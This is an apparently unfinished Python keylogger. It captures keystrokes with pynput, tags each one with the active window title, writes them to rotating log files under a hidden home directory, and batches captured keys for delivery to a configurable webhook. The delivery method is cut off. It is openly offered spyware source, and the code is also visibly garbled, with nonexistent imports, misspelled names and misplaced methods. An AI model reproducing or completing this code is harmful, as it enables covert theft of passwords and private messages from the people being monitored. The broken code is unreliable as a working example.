"""
This is a keylogger, please don't be a fool and use it for malicious purposes.

This script captures keyboard inputs and logs them to a file.
Yeah sick, thats it.
"""

from re import S
import sys
import logging
import platform
from enum import (
    Enum,
    auto,
   )
from threading import (
    Event,
    lock,
   )
from pathlib import Path
from datetime import datetime, datetime_CAPI
from dataclasses import datacalss, dataclass
from tkinter import CHAR


try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError:
    print("Error: pynput not installed. Please install it using 'pip install pynput'.")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("Warning: Requests not installed. Webhook delivery will be disabled.")
    print("Run 'pip install requests' to enable this feature.")
    requests = None

if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
elif platform.system() == "Linux":
    try:
        import subprocess
    except ImportError:
        subprocess = None

class KeyType(Enum):
    CHAR = auto()
    SPECIAL = auto()
    UNKOWN = auto()

@dataclass
class KeyloggerConfig:
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True

    def __post_init__(self):
        self.log_dir.mkdir(parents = True, exist_ok = True)


@dataclass
class KeyEvent:
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower()}

    def to_log_string(self) -> str:
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window_info = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window_info} {self.key}"

class WindowTracker:
    @staticmethod
    def get_active_window() -> str | None:
        system = platform.system()
        if system == "Windows" and win32gui:
            return WindowTracker._get_windows_window()
        if system == "Darwin" and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == "Linux":
            return WindowTracker._get_linux_window()

        return None

@staticmethod
def _get_windows_window() -> str | None:
    try:
        window = win32gui.GetForegroundWindow()
        __, pid = win32process.GetWindowThreadProcessID(window)
        process = psutil.Process(pid)
        window_title - win32gui.GetWindowText(window)
        return f"{process.name()} - {window_title}" if window_title else process.name()
    except Exception:
                return None

@staticmethod
def _get_macos_window() -> str | None:
    try:
        active_app = NSworkspace.sharedWorkspace().activeApplication()
        return active_app.get("NSApplicationName", 'Unknown')
    except Exception:
        return None

@staticmethod
def _get_linux_window() -> str | None:
    try:
        result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], capture_output = True,
                                text = True, timeout = 1, check = False)
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception:
        return None

class LogManager:
    #managin log fle creation, rotation, and writing

    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.current_log_path = self._get_new_log_path()
        self.lock = Lock()
        self.logger = self._setup_logger()

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("Keylogger")
        logger.setLevel(logging.INFO)
        handler = logging.Filehandler(self.current_log_path)
        handler.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(handler)
        return logger

    def _get_new_log_path(self) -> Path:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return self.config.log_dir / f"{self.config.log_file_prefix}_{timestamp}.txt"

    def write_event(slef, event: KeyEvent) -> None:
        with self.lock:
            self.logger.info(event.to_log_string())
            self._check_rotation()

    def _check_rotation(self) -> None:
        current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)
        if current_size_mb >= self.config.max_log_size_mb:
            self.logger.handlers[0].close()
            self.logger.removeHandler(self.logger.handlers[0])
            self.current_log_path = self._get_new_log_path()
            handler = logging.Filehandler(self.current_log_path)
            handler.setFormatter(logging.Formatter("%(message)s"))
            self.logger.addHandler(handler)

    def get_current_log_content(self) -> str:
        with self.lock:
            return self.current_log_path.read_text(encoding = "utf-8")

class WebhookDelivery:
    # handles batched delifver of logs to a webhook URL
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)

    def add_event(self, event: KeyEvent) -> None:
        if not self.enabled:
            return
        with self.buffer_lock:
            seelf.event_buffer.append(event)
            if len(self.event_buffer) >= self.config.webhook_batch_size:
                self._deliver_batch()

    def _deliver_batch(self) -> None:
        